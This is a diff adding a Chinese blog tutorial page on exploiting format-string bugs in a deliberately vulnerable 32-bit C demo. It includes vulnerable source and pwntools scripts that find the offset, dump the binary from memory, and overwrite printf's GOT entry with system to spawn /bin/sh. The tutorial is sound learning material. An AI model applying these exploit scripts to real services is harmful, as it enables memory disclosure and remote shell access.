@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>格式化字符串漏洞利用（二） | √素顏☃繁華夢☪</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="格式化字符串中危害最大的两点，一是leak memory，二是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存的任意读写。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞利用（二）">
+<meta property="og:url" content="http://yoursite.com/2017/09/23/格式化字符串漏洞利用（二）/index.html">
+<meta property="og:site_name" content="√素顏☃繁華夢☪">
+<meta property="og:description" content="格式化字符串中危害最大的两点，一是leak memory，二是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存的任意读写。">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/9.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/10.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/11.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/12.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/13.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/14.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/15.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/28.png">
+<meta property="og:image" content="http://ote495tnr.bkt.clouddn.com/29.png">
+<meta property="og:updated_time" content="2017-10-04T05:25:52.198Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="格式化字符串漏洞利用（二）">
+<meta name="twitter:description" content="格式化字符串中危害最大的两点，一是leak memory，二是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存的任意读写。">
+<meta name="twitter:image" content="http://ote495tnr.bkt.clouddn.com/9.png">
+  
+    <link rel="alternate" href="/atom.xml" title="√素顏☃繁華夢☪" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-格式化字符串漏洞利用（二）" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/23/格式化字符串漏洞利用（二）/" class="article-date">
+  <time class="post-time" datetime="2017-09-23T03:34:47.000Z" itemprop="datePublished">
+    <span class="post-month">9月</span><br/>
+    <span class="post-day">23</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      格式化字符串漏洞利用（二）
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>格式化字符串中危害最大的两点，一是leak memory，二是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存的任意读写。</p>
+<a id="more"></a>
+<h5 id="0x-1-Leak-Memory"><a href="#0x-1-Leak-Memory" class="headerlink" title="0x 1 Leak Memory"></a>0x 1 Leak Memory</h5><p>先对一个简单的Demo进行研究：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    char a[1024];</div><div class="line">    memset(a, &apos;\0&apos;, 1024);</div><div class="line">    read(0, a, 1024);</div><div class="line">    printf(a);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line">// $ gcc test.c -o test -m32</div><div class="line">// $ socat TCP-LISTEN:5555,fork EXEC:./test</div></pre></td></tr></table></figure>
+<p>假设我们不知道该程序的原码，连bin都没有，只是能访问这样的一个应用：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/9.png" alt="1"></p>
+<p>在这种情况下，就是去尝试各种漏洞的攻击方法，比如栈溢出漏洞就是输入一堆字符，比如<code>100*a</code>，而格式化字符串漏洞是使用“%x”这类格式化字符串去尝试，比如：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/10.png" alt="2"></p>
+<p>得到了这样的返回就说明该程序存在格式化字符串漏洞，因为没有源码或bin，并不知道要往哪里写数据，所以我们可以先leak memory，获取程序的源码</p>
+<p>leak memory利用到的是<code>%s</code>格式化字符，它的作用是输出对应参数指向地址的值，也就是说它对应的参数是一个指针，而我们可以得到该指针对应的内存数据</p>
+<p>我们还可以继续改进该格式化字符串，<code>%2$s</code>，它表示的意义是输出第二个参数指向的内存的值。</p>
+<p>那么我们怎么通过上面的格式化字符串获取我们想要的内存地址呢？这就涉及到第三个知识点。</p>
+<p>格式化字符串漏洞是怎么产生的？首先要有一个函数，比如<code>read</code>，比如<code>gets</code>获取用户输入的数据存储到局部变量中，然后直接把该变量作为<code>printf</code>这类函数的第一个参数值。</p>
+<p>其中局部变量是储存在栈中的，而且是存储在栈的高位地址上，这里具体的细节可以去读读汇编代码，简单的说，进入到一个函数中后，会<code>sub rsp,xxx</code>一段局部变量的栈空间，然后函数的参数啥的都是push到局部变量的栈空间之上。</p>
+<p>理解了上述的知识点后，我们可以输入想leak数据的内存地址，然后爆破出我们输入数据的位置，不就能leak相应地址的内存数据了么。</p>
+<p>比如我们输入<code>AAAA%2$x</code>，如果输出<code>AAAA</code>十六进制数，则说明第二个参数为我们输入的数据的起始位置。</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/11.png" alt="3"></p>
+<p>这样我们得到的payload:<code>addr+%7$x</code>，返回值为<code>add</code>r指向的内存的字符串，知道<code>\0</code>为止。</p>
+<p>这里我们可以进行测试下（我们现在是处于研究状态，虽然假想没bin，但实际我们是有的，所以可以进行测试来证明我们的结论）</p>
+<p><code>$ objdump -d test -M intel</code></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/12.png" alt="4"></p>
+<p>从上面的测试代码中可以证明上述所讲的结论，我们成功leak出相应内存的数据（知道<code>\x00</code>为止）</p>
+<p>上面爆破出来的7我们成为offset，pwntools有自动化代码可以计算出offset:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">#context.log_level = &apos;debug&apos;</div><div class="line">def getoffset(payload):</div><div class="line">    p = process(&quot;./test&quot;)</div><div class="line">    p.sendline(payload)</div><div class="line">    info = p.recv()</div><div class="line">    p.close()</div><div class="line">    return info</div><div class="line"></div><div class="line">autofmt = FmtStr(getoffset)</div><div class="line">print autofmt.offset</div></pre></td></tr></table></figure>
+<p><img src="http://ote495tnr.bkt.clouddn.com/13.png" alt="5"></p>
+<p>测试完了，现在又恢复到没有bin状态，有了前面的基础，要dump出整个bin就很容易了。</p>
+<p>在Linux下，不开启PIE保护时，32位的PIE的默认值首地址为<code>0x8048000</code>，如果开启了PIE保护，则需要根据ELF的魔术头<code>7f 45 4c 46</code>进行爆破，内存地址一页一页的往前翻知道翻到ELF的魔术头为止：</p>
+<p>测试的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">p = remote(&quot;127.0.0.1&quot;,5555)</div><div class="line">p.send(&quot;%10$saaaaaaa&quot; + p32(0x8048000))</div><div class="line">print p.recv()</div></pre></td></tr></table></figure>
+<p>可以成功dump数据了：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/14.png" alt="6"></p>
+<p>原理都懂了，可以写payload去dump整个bin回来了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">#context.log_level = &apos;debug&apos;</div><div class="line">f = open(&quot;source.bin&quot;, &quot;ab+&quot;)</div><div class="line"></div><div class="line">begin = 0x8048000</div><div class="line">offset = 0</div><div class="line"></div><div class="line">while True:</div><div class="line">    addr = begin + offset</div><div class="line">    p = process(&quot;./test&quot;)</div><div class="line">    p.sendline(&quot;%10$saaaaaaa&quot; + p32(addr))</div><div class="line">    try:</div><div class="line">        info = p.recvuntil(&quot;aaaaaaa&quot;)[:-7]</div><div class="line">    except EOFError:</div><div class="line">        print offset</div><div class="line">        break</div><div class="line">    info += &quot;\x00&quot;</div><div class="line">    p.close()</div><div class="line">    offset += len(info)</div><div class="line">    f.write(info)</div><div class="line">    f.flush()</div><div class="line">f.close()</div></pre></td></tr></table></figure>
+<p>内存dump下来后，虽然跟原始bin有很大不同，也运行不了，但是丢到IDA中任然是可以看到的：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/15.png" alt="7"></p>
+<h5 id="0x2-Write"><a href="#0x2-Write" class="headerlink" title="0x2 Write"></a>0x2 Write</h5><p>二进制漏洞的最终目的都是要getshell，所以在我们获取bin后，接下来就是要getshell了</p>
+<p>不过之前的demo过于简单，没有什么好的getshell的方法，对demo进行下修改。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    char a[1024];</div><div class="line">    while(1) </div><div class="line">    &#123;</div><div class="line">        memset(a, &apos;\0&apos;, 1024);</div><div class="line">        read(0, a, 1024);</div><div class="line">        printf(a);</div><div class="line">        fflush(stdout);</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>和之前的demo比，多了循环，不像之前一样一下就退出了。</p>
+<p>在这样情况下，我们可以很容易只依靠格式化字符串漏洞进行攻击，利用的逻辑很简单，根据之前的知识点，leak出bin，然后获取到<code>printf</code>函数的got表地址，然后把这个地址的值改为<code>system</code>函数的地址，在下次循环的时候，输入<code>/bin/sh</code>，则<code>printf(a);</code>实际执行的却是<code>system(&#39;/bin/sh&#39;)</code>。</p>
+<p>利用过程中，第一个知识点：dump没存的数据，也就是上面的内容，得到bin后，可以很容易的获取到got表信息，</p>
+<p>接下来第二个知识点就是获取<code>system</code>函数的地址，不过却需要爆破跑，每次首先获取<code>printf</code>和<code>system</code>函数之间的差值估测一个大概范围进行爆破，得到的数据和<code>system</code>函数中的一些特征数据变化对比，判断是否是system函数。</p>
+<p>最后一步就是通过格式化字符串内容进行写内存了，覆盖got表中的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">printf_got = 0x804a010</div><div class="line">system_add = 0xaaaaaaaa</div><div class="line"></div><div class="line">def exec_fmt(payload):</div><div class="line">    p.sendline(payload)</div><div class="line">    return p.recv()</div><div class="line">p=process(&quot;./test2&quot;)</div><div class="line">#p = remote(&quot;127.0.0.1&quot;, 10001)</div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">payload = fmtstr_payload(autofmt.offset, &#123;printf_got: system_add&#125;)</div><div class="line">print payload</div></pre></td></tr></table></figure>
+<p>上述代码中<code>autofmt = FmtStr(exec_fmt)</code>这行的内容之前都提到过，接下来就是<code>fmtstr_payload()</code>函数，这个函数的作用是用来生成格式化字符串漏洞写内存的的payload。第一个参数为offset偏移，第二个参数是一个字典，意义是往key的地址写入value的值，也就是往<code>0x804a010</code>地址写入数据<code>0xaaaaaaaa</code>。我们可以看下输出的payload：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/28.png" alt=""></p>
+<p>最终的exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">#context.log_level = &apos;debug&apos;</div><div class="line">#p = remote(&quot;127.0.0.1&quot;, 10001)</div><div class="line">p=process(&quot;./test2&quot;)</div><div class="line"># get printf libc addr</div><div class="line">printf_got = 0x0804a010</div><div class="line">leak_payload = &quot;bb%9$saa&quot; + p32(printf_got)</div><div class="line">p.sendline(leak_payload)</div><div class="line">p.recvuntil(&quot;bb&quot;)</div><div class="line">info = p.recvuntil(&quot;aa&quot;)[:-2]</div><div class="line">print info.encode(&apos;hex&apos;)</div><div class="line"># get system libc addr</div><div class="line">print_addr = u32(info[:4])</div><div class="line">print &quot;print_addr:&quot;+hex(print_addr)</div><div class="line">#p_s_offset = 53479     # addr(printf) - addr(system)</div><div class="line">printf_offset=0x4D280</div><div class="line">system_offset=0x40190</div><div class="line">system_addr = print_addr - printf_offset + system_offset</div><div class="line">print &quot;systen_addr:&quot;+hex(system_addr)</div><div class="line"># get payload</div><div class="line">payload = fmtstr_payload(7, &#123;printf_got: system_addr&#125;)</div><div class="line"># send payload</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(&apos;/bin/sh&apos;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p><img src="http://ote495tnr.bkt.clouddn.com/29.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/09/23/格式化字符串漏洞利用（二）/" data-id="cjfgehm34000fvgunq2vi1kkc" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn-format/">pwn,format</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/09/28/一步一步学ROP之x86篇/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          一步一步学ROP之x86篇
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/09/22/格式化字符串漏洞/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">格式化字符串漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">√素顏☃繁華夢☪</h1>
+    <h2 class="blog-subtitle">Go!Go!Go!</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/xiaorui1234" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://foxroot.cn/" target="_blank" title="FoxRoot">
+          FoxRoot
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 XiaoRui<br>
+      
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
